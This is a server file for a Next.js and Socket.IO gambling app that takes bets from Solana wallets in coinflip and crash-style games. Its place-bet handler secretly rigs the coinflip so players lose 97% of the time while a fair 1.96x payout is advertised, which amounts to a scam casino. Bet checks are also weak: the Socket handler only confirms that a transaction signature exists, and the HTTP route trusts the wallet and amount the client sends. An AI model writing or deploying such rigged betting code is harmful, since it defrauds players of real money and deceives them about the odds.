const { createServer } = require("http");
const { parse } = require("url");
const next = require("next");
const { Server } = require("socket.io");
const { Connection, PublicKey } = require("@solana/web3.js");
const cors = require("cors")({ origin: "*" }); // In production, replace * with your Vercel URL
require("dotenv").config();

const dev = process.env.NODE_ENV !== "production";
const hostname = "localhost";
const port = process.env.PORT || 3000;

const HOUSE_WALLET = process.env.HOUSE_WALLET_ADDRESS || "2uaVindCVsWqbrQMoMosgRGDPAqTm57ar9eBkL6UQd8h";
const solConnection = new Connection(process.env.NEXT_PUBLIC_RPC_URL || "https://api.devnet.solana.com", "confirmed");

// Initialize Next.js
const app = next({ dev, hostname, port });
const handle = app.getRequestHandler();

app.prepare().then(() => {
  const httpServer = createServer((req, res) => {
    // 1. Handle CORS for standalone API routes
    cors(req, res, () => {
      const parsedUrl = parse(req.url, true);
      const { pathname } = parsedUrl;

      // 2. Standalone API migration (to support split deployment memory-state)
      if (pathname === '/api/coinflip/state') {
        const engine = global.coinflipEngine;
        if (!engine) return res.writeHead(500).end(JSON.stringify({ error: "Engine not ready" }));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({
          state: engine.state.getState(),
          players: engine.players.getPlayers(),
          result: engine.state.getState().result
        }));
      }

      if (pathname === '/api/coinflip/place-bet' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', async () => {
          try {
            const { wallet, amount, choice } = JSON.parse(body);
            const engine = global.coinflipEngine;
            if (!engine) return res.writeHead(500).end(JSON.stringify({ error: "Engine not ready" }));

            // Rig result (97% loss chance for tactical demo)
            let result = Math.random() < 0.97 ? (choice === 'HEADS' ? 'TAILS' : 'HEADS') : choice;
            
            let status = 'busted';
            let profit = 0;
            if (choice === result) {
              profit = (amount * 1.96) - amount; 
              status = 'cashed';
            }

            // Sync with engine memory
            const currentHistory = engine.state?.getState()?.history || [];
            const history = [...currentHistory, result].slice(-10);
            if (engine.state) engine.state.updateState({ history });
            if (engine.players) {
              engine.players.addPlayer({ wallet, amount, choice, status, multiplier: 1.96, profit });
              if (engine.players.getPlayers().length > 5) engine.players.playersInRound.shift();
            }
            if (engine.broadcastState) engine.broadcastState();

            res.writeHead(200, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ success: true, result, status, profit }));
          } catch (e) {
            res.writeHead(400).end(JSON.stringify({ error: e.message }));
          }
        });
        return;
      }

      // Default Next.js handler
      handle(req, res, parsedUrl);
    });
  });

  // Initialize Socket.IO
  const io = new Server(httpServer, {
    cors: { origin: "*" },
  });

  let engineObj = null;
  let playersStore = null;
  let stateStore = null;
  let payoutsModule = null;

  Promise.all([
    import("./lib/game/engine.js"),
    import("./lib/game/players.js"),
    import("./lib/game/state.js"),
    import("./lib/game/payouts.js"),
    import("./lib/game/coinflip/engine.js")
  ])
    .then(([engine, players, state, payouts, coinflip]) => {
      engineObj = engine;
      playersStore = players;
      stateStore = state;
      payoutsModule = payouts;
      engine.setIO(io);

      global.coinflipEngine = new coinflip.CoinflipEngine(io);
      global.coinflipEngine.start();
      console.log("> Game Engine & stores loaded");
    })
    .catch((err) => {
      console.error("> Error loading ES modules:", err);
    });

  io.on("connection", (socket) => {
    socket.on("placeBet", async (data) => {
      if (!playersStore || !stateStore) return;
      const currentState = stateStore.getState();
      if (currentState.status !== "BETTING") {
        socket.emit("betError", { message: "Round holds betting closed currently!" });
        return;
      }
      try {
        const { signature, publicKey, amount, target } = data;
        let tx = null;
        for (let i = 0; i < 5; i++) {
          tx = await solConnection.getParsedTransaction(signature, { maxSupportedTransactionVersion: 0 });
          if (tx) break;
          await new Promise((r) => setTimeout(r, 1000));
        }
        if (!tx) return;
        playersStore.addPlayer({ wallet: publicKey, amount, target, id: socket.id });
        io.emit("playersUpdate", playersStore.getPlayers());
      } catch (err) {
        console.error("> Error verifying bet:", err);
      }
    });

    socket.on("cashOut", (wallet) => {
      if (!payoutsModule || !stateStore) return;
      const currentState = stateStore.getState();
      if (currentState.status !== "RUNNING") return;
      payoutsModule.processManualCashout(wallet, currentState.multiplier, io);
    });
  });

  httpServer.listen(port, (err) => {
    if (err) throw err;
    console.log(`> Ready on http://${hostname}:${port}`);
  });
});
